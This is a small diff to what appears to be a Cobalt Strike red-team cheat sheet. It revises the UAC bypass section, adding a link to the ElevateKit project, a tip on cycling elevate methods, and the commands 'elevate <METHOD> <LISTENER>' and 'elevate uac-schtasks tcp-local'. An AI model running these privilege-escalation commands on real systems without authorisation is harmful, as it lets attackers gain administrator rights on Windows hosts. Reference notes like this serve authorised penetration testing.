@@ -186,9 +186,13 @@ link <COMPUTERNAME>
 - The use of 64-bit payloads on 64-bit Operating Systems is preferable to using 32-bit payloads on 64-bit Operating Systems.
 
 ## UAC Bypass
-#### UAC bypass method 1
+- https://github.com/cobalt-strike/ElevateKit
+
+#### UAC bypass
+- Typing `elevate` and then tab lets you cycle through the methods.
 ```
-elevate uac-token-duplication <LISTENER>
+elevate <METHOD> <LISTENER>
+elevate uac-schtasks tcp-local
 ```
 
 #### UAC bypass method 2 runasadmin
